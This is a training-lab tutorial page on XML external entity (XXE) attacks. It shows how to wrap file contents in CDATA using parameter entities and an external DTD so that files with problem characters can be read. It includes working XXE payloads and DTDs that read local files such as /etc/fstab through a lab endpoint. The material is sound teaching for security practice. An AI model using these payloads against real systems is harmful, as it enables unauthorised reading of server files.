---
title: "Using CDATA"
weight: 20
---

{{% notice note %}}
We will use the Basic XXE page (`/basic-xxe.do`) for these exercises.
{{% /notice %}}

As we saw at the end of the last exercise, sometimes the content of the file we are reading will cause XML parsing errors. These errors may prevent us from seeing the contents of the file. In this page we will learn how to get around that.

First, lets go through a quick comparison between two files, one with a `<` and one without.

Contents of `/home/vagrant/test_files/heart.txt`:

```plaintext
I <3 XXE!
```

Lets try and read the file using the XXE techniques we first learned. Here is what we will submit:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY me SYSTEM "file:///home/vagrant/test_files/heart.txt">
]>

<name>&me;</name>
```

Because of the `<` found in the file we are not able to see the contents.

![](/static/img/heart_error.png)

To double-check, lets do the same for the `love.txt` file `/home/vagrant/test_files/love.txt`:

```plaintext
I love XXE!
```

Submit the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY me SYSTEM "file:///home/vagrant/test_files/love.txt">
]>

<name>&me;</name>
```

![](/static/img/love.png)

Based on that we can say it is probable that the `<` in the `heart.txt` file is what caused the issue.

CDATA is our answer. CDATA tells the XML parser to ignore the contents within the brackets. Doing this we can avoid parsing issues with files that have characters the parser might have trouble with. A CDATA section begins with `<![CDATA[` and ends with `]]>`. Anything surrounded by those is ignored by the XML parser.

Your first instinct may be to try and do something like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY start "<![CDATA[">
  <!ENTITY content "file:///home/vagrant/test_files/heart.txt">
  <!ENTITY end "]]>">
]>

<name>&start; &content; &end;</name>
```

This won't work because it violates General Entity rule #2 - It is not valid XML data.

What we are going to do is create four Parameter Entities and one General Entity.

1. The first Parameter Entity will be the content of the file we want to read.
2. We will then set another equal to the start of our CDATA string.
3. The third will be set to the end of the CDATA string.
3. And finally a fourth will contain the General Entity which will tie all of those together.

The General Entity will be what we are able to call in our XML document. Because of the constraints on Parameter Entities we will need to use an external dtd. Here is what the it looks like (`cdata.dtd` found here: `/home/vagrant/dtds/cdata.dtd`).

```xml
<!ENTITY % file SYSTEM "file:///home/vagrant/test_files/heart.txt">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;
```

Now we just need to grab this dtd, execute it and use the General Entity `&all;` in our document. Submit the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/cdata.dtd">
  %ext;
]>

<name>&all;</name>
```

![](/static/img/heart.png)

Boom! We can now view files that XML would otherwise choke on. To verify we solved our initial issue, lets try and view the `/etc/fstab` file we could not view earlier. Here is the dtd (`/home/vagrant/dtds/fstab_cdata.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;
```

What we will submit:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/fstab_cdata.dtd">
  %ext;
]>

<name>&all;</name>
```

![](/static/img/fstab.png)
